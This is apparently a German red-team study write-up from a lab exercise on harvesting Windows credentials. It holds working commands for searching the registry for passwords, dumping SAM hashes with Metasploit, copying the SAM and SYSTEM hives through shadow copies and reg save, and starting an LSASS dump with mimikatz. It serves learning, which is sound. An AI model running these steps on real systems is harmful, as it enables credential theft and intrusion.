# Introduction

### Welcome to Credentials Harvesting

Hier gehen wir mal durch, wie wir als Red Teamer Credentials erhalten, wiederverwenden oder fälschen werden.

Credential Harvesting bezieht sich auf das besorgen von Credentials wie Login informationen, Account Namen und Passwörter. Es ist eine Technik zum exfiltrieren von Credentials aus ganz unterschiedlichen Orten in einem System wie Clear-Text-Files, Registrys oder Memory Dumps etc.

Legemetierte Credentials zu bekommen hat immer Vorteile wie:

- Zugang zu anderen Systemen (Lateral Movement)
- Es wird schwerer uns zu entdecken
- Wir haben die Möglichkeit zur Erstellung und Pflege von Accounts, die uns helfen unsere Ziele als Red Teamner zu erreichen.

### Lernziele

- Verstehen der Methode zum extrahieren von Credentials auf lokalen Windows Maschinen
- Erlernen wie man Zugang zur Windows Memory bekommt und Clear-Text Passwörter und Authenzifizierungstickets dumpt, lokal als auch remote.
- Einführung in den Windows Credential Manager und wie man Credentials aus diesem extrahiert
- Erlernen von Methoden wie man Credentials für einen Domain Controller extrahiert
- Erkundung des Local Administrator Password Solution (LAPS) Feature
- Einführung in AD Attacken die zur Beschaffung von AD Credentials dienen

# Credentials Harvesting

### Credentials Harvesting

Credentials Harvesting ist ein Begriff für den Zugriff auf Benutzer- und Systemanmeldeinformationen. Dabei handelt es sich um eine Technik zum Suchen oder Stehlen gespeicherter Anmeldeinformationen, einschließlich Netzwerk-Sniffing, bei der ein Angreifer übermittelte Anmeldeinformationen erfasst.

In welchen Formen lassen sich Credentials finden?

- Account Details (usernames und passwords)
- Hashes wie bspw. NTLM Hashes
- Authentication Tickets wie TGT oder TGS
- Alle Informationen die dabei helfen, sich Zugang zu einem System zu beschaffen (private Keys etc.)

Allgemein gesagt gibt es zwei Arten von Credential Harvesting, einmal Extern und einmal Intern. Bei Extern handelt es sich in der Regel um Phishing Attacken die einen Benutzer dazu bringen sollen, seine Zugangsdaten preis zu geben. Beim internen Credential Harvesting gibt es verschiedene Ansätze auf die wir jetzt weiter eingehen.

# Credential Access

### Clear-text files

Angreifer können einen kompromittierten Computer nach Anmeldeinformationen in lokalen oder Remote-Dateisystemen durchsuchen. Klartextdateien können vertrauliche Informationen enthalten, die von einem Benutzer erstellt wurden und Passwörter, private Schlüssel usw. enthalten. Das MITRE ATT&CK-Framework definiert sie als Unsecured Credentials: Credentials In Files [T1552.001](https://attack.mitre.org/techniques/T1552/001/).

Clear-Text Files die interessant sein könnten:

    - Commands history
    - Configuration files (Web App, FTP files, etc.)
    - Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
    - Backup files
    - Shared files and folders
    - Registry
    - Source code 

Für den ersten Punkt können wir als Besipiel ***C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt*** nehmen.
Hier werden alle Powershell Commands eines Benutzers gespeichert.
Es lohnt sich hier immer mal reinzuschauen und zu sehen, woran der User gerade arbeitet. 

Ein weiterer Befehl wäre vielleicht auch folgender:

```bash
c:\Users\user> reg query HKLM /f password /t REG_SZ /s
#OR
C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```

Damit durchsuchen wir die Windows Registry nach dem Keyword "password"

### Database Files

Anwendungen nutzen Datenbankdateien, um Einstellungen, Konfigurationen oder Anmeldeinformationen zu lesen oder zu schreiben. Datenbankdateien werden in Windows-Betriebssystemen normalerweise lokal gespeichert. Diese Dateien sind ein hervorragendes Ziel für die Überprüfung und Suche nach Anmeldeinformationen. Weitere Informationen finden Sie im THM-Raum: Breaching AD. Es enthält ein Paradebeispiel für das Extrahieren von Anmeldeinformationen aus der lokalen McAfee Endpoint-Datenbankdatei.


### Password Manager

Password Manager speichern Login Informationen für unterschiedliche Anwendungen. Damit muss ein Password Manager äußerst sicher sein. 
Windows hat einen eingebauten Password Manager, es gibt aber auch 3rd Party Anwendungen wie bspw. Keepass, LastPass etc.

Falsche Konfigurationen oder Sicherheitslücken könnten zu Datenlecks führen. Aber auch mit verschiedenen Tools könnte man Anwendungen angreifen, die einen Password Manager nutzen.

### Memory Dump

Der Speicher ist ein wunderbare Quelle um an sensitive Daten zu kommen, denn diese werden während der Laufzeit oder Ausführung in diesen geladen. Administratoren können auf diesen Speicher zugreifen. Was finden wir unter anderem im Speicher?

- Clear-Text Credentials
- Cached Passwörter
- AD Tickets

### Active Directory

Active Directory ist aufgrund von häufigen Fehlkonfigurationen häufig Ziel von Red Teaming Attacken. Darunter fallen bspw.:

- Users Description
Admins schreiben Credentials gerne mal in die Beschreibung für neuen Mitarbeiter und lasses es dann so. 
- Group Policy SYSVOL
geleakte Verschlüsselungskeys führen zu administrativen Zugängen.
- NTDS
Enthält AD User Credentials
- AD Attacks
Fehlkonfigurationen allgemein führen zu Schwachstellen.

### Network Sniffing

Ein erster Zugang verhilft einem Angreifer unterschiedliche Netzwerkattacken zu starten gegen lokale Computer sowie der AD Umgebung. Die Man-in-the-Middle Attacke gegen Netzwerkprotokolle erstellt eine schädliche Quelle mit der sich die Geräte in einem Netzwerk verbinden möchten und dabei sensitive Daten preisgeben wie bspw. NTLM Hashes.

# Local Windows Credentials

Ganz grundlegend stellt Windows zwei Arten von Benutzerkonten zur Verfügung, lokale sowie Domainaccounts. Lokale Userdaten werden lokal auf dem jeweiligen Gerät gespeichert, Domain User Daten werden im Active Directory gespeichert. In dieser Aufgabe geht es um die lokalen Accounts.

### Keystrokes

Ein Keylogger ist ein Programm oder eine Hardware die Keyboard Eingaben überwacht und loggt. In einem Red Team Einsatz können wir mit bspw. dem Metasploit Framework sensitive Daten über einen Keylogger abgreifen. 
Das haben wir bereits im Exploiting AD Room gemacht.

### Security Account Manager (SAM)

Der SAM ist eine eine lokale Windows Datenbank die Benutzerdaten wie Usernames und Passwörter speichert. Die Daten werden darin verschlüsselt gespeichert. Ausserdem ist es eigentlich nicht möglich, das irgendein Benutzer auf diese Datenbank zugreift oder ausliest, während das Betriebssystem läuft. Aber es gibt natürlich gewisse Wege, den Inhalt der Datenbank zu dumpen.

Dazu überprüfen wir mal, ob wir die SAM auslesen können:

>type c:\windows\system32\config\sam

```bash
C:\Windows\system32>type c:\Windows\System32\config\sam
type c:\Windows\System32\config\sam
The process cannot access the file because it is being used by another process.

C:\Windows\System32> copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\ 
copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
The process cannot access the file because it is being used by another process.
        0 file(s) copied.
        
```

### Metasploit's HashDump

Die erste Methode zum Auslesen der SAM Datei ist der Hashdump, den das Metasploit-Framework bereitstellt. Dazu nutzt in-memory Code Injection in den LSASS.exe Prozess. 

```bash
meterpreter > getuid
Server username: THM\Administrator
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3b784d80d18385cea5ab3aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d:::
CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:443e64439a4b7fe780db47fc06a3342d:::
```

### Volume Shadow Copy Service

Ein weiterer Ansatz ist der Microsoft Volume Shadow Copy Service, der dazu dient eine Volume-Sicherung durchzuführen, während Anwendungen auf Volumes lesen/schreiben. Hier gibt es weiterführende Informationen. [Windows Doku](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)

Im Detail werden wir WMIC dazu nutzen eine Shadow Volume Kopie zu erstellen. Das machen wir über die Befehlszeile mit Adminrechten folgendermaßen:

1. Starten von cmd.exe mit Admin-Rechten
2. Ausführen des WMIC Befehls um eine Shadow-Kopie von c:\ zu erstellen
3. Überprüfen ob Schritt 2 erfolgreich war
4. Die SAM Datei aus dem neu erstellten Volume kopieren

```bash
C:\Users\Administrator>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
};
```

Anschließend überprüfen wir mit VSSADMIN ob die Shadow-Kopie erfolgreich erstellt wurde

```bash
C:\Users\Administrator>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {0c404084-8ace-4cb8-a7ed-7d7ec659bb5f}
   Contained 1 shadow copies at creation time: 5/31/2022 1:45:05 PM
      Shadow Copy ID: {d8a11619-474f-40ae-a5a0-c2faa1d78b85}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```

Wir sehen, dass eine Kopie unter ***\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1*** abgespeichert wurde.

Wie bereits erwähnt sind die Daten in der SAM Datei verschlüsselt. Wir müssen uns also auch den Schlüssel für die SAM Datei kopieren um an die Daten zu kommen. Der Schlüssel befindet sich im gleichen Ordner und heißt "system".

```bash
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\thm\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```


### Registry Hives

Eine weitere Möglichkeit um die SAM Datenbank zu dumpen geht über die Windows Registry. Windows Reg speichert nämlich auch einige Kopien aus der SAM Datenbank um sie entsprechenden Services anbieten zu können. Mit reg.exe können wir Werte der Windows Reg speichern. Wie bereits erwähnt brauchen wir zwei Files um die SAM Datenbank zu dumpen:

```hash
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>
```

Wenn wir diese Dateien wieder mit impacket-secretsdump öffnen, erhalten wir wieder die entsprechenden Hashes.
Wir können die Hashes jetzt entweder cracken oder sie zur Authentifizierung nutzen.

# Local Security Authority Subsystem Service (LSASS).

Der Local Security Authority Server Service (LSASS) ist ein Windows-Prozess, der die Sicherheitsrichtlinie des Betriebssystems verwaltet und auf einem System durchsetzt.
Das Windows-System speichert Anmeldeinformationen im LSASS-Prozess, um Benutzern den Zugriff auf Netzwerkressourcen wie Dateifreigaben, SharePoint-Sites und andere Netzwerkdienste zu ermöglichen, ohne jedes Mal Anmeldeinformationen eingeben zu müssen, wenn ein Benutzer eine Verbindung herstellt.

Wenn wir über Administratorrechte verfügen, können wir den Prozessspeicher von LSASS speichern. Das Windows-System ermöglicht es uns, eine Dump-Datei zu erstellen, also eine Momentaufnahme eines bestimmten Prozesses.  This attack is defined in the MITRE ATT&CK framework as "[OS Credential Dumping: LSASS Memory (T1003)](https://attack.mitre.org/techniques/T1003/001/)".


Wir können lsass über den Task Manager dumpen, über die Kommandozeile mit Sysinternal oder auch Mimikatz.

```hash
mimikatz # privilege::debug
Privilege '20' OK
```











